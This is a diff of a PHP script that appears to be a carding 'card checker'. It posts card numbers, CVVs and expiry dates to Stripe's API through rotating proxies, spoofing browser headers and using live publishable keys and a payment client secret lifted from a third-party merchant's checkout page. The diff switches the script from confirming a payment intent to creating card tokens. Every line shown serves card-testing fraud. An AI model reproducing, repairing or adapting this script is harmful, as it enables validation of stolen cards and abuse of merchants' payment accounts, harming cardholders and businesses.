@@ -230,19 +230,19 @@ $ip = "Proxy Dead:[".$rotate."]";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3KbtTKD7E5KeLz7Y0bZXr63L/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/payment_intents/pi_3KbtTKD7E5KeLz7Y0bZXr63L/confirm',
+'path: /v1/tokens',
 'scheme: https',
 'accept: application/json',
-'accept-language: en-US,en;q=0.9,bn;q=0.8',
+'accept-language: en-US',
 'content-type: application/x-www-form-urlencoded',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'origin: https://checkout.stripe.com',
+'referer: https://checkout.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
@@ -257,7 +257,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'+'.$last.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&payment_method_data[muid]=c7a2b5b1-a81d-4ce4-b98a-2f64154faebd94ca6a&payment_method_data[sid]=e49124e2-8d6e-46c4-8475-c320ed969d2cb82323&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F211a0366e%3B+stripe-js-v3%2F211a0366e&payment_method_data[time_on_page]=94342&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=true&key=pk_live_51I50nYD7E5KeLz7YoQinJtyPrpoFDfh1FJkobELxo1n2QqfvD2vak08BILK8iLStEzFKSC8RYlw4PnjayhQadOj900FgmYUdQj&client_secret=pi_3KbtTKD7E5KeLz7Y0bZXr63L_secret_YrjNKPusdz4cFj0VjqmiR1h60');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F99.0.4844.51+Safari%2F537.36&device_id=4fa5735f-5963-4e9e-9bc4-919b1befedc7&referrer=https%3A%2F%2Fwww.freeandwilling.com%2Ftransactions%2Fnew%3Fitem%3D12006&pasted_fields=number&time_checkout_opened=1646949361&time_checkout_loaded=1646949359&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=Infoff%40tablig.net&time_on_page=59968&guid=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&muid=38d9be5d-a54c-4e3e-a1f7-a2768d196779154f94&sid=53cbca6e-752f-46ba-9c53-478640f9fc9088c568&key=pk_live_mVAaIghclsy3joMFdBLOpPJ2');
 
 $result = curl_exec($ch);
 $info = curl_getinfo($ch);
